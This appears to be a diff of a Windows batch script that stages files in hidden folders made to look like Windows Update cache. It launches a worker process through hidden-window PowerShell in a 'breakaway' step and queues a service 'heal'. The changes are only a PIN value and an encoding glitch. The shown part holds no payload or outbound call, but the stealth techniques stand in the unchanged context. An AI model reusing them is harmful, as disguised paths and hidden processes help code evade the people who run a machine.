@@ -4,7 +4,7 @@ setlocal EnableExtensions EnableDelayedExpansion
 set "WD=C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache"
 set "STAGE=%SystemRoot%\Temp\.upd"
 set "CURL=%SystemRoot%\System32\curl.exe"
-set "PIN=e5fb335"
+set "PIN=e5558de"
 set "FP=36e506ff016b2151"
 set "KEEP=5f6010579852e507"
 set "ALT=f861c8140d453427"
@@ -33,7 +33,7 @@ del /f /q "%WD%\gryxa_msi.lock" "%WD%\gryxa_heal.flag" >nul 2>&1
 
 set "ACTION=fail"
 
-rem 1) PowerShell breakaway (preferred — wmic often missing)
+rem 1) PowerShell breakaway (preferred ??? wmic often missing)
 powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c','%WORKER%' -WindowStyle Hidden" >nul 2>&1
 if not errorlevel 1 set "ACTION=ps-start"
 
@@ -55,3 +55,4 @@ echo G10=OK
 echo ACTION=!ACTION!
 echo QUEUED HEAL - wait 2-3 min then sc query
 endlocal
+
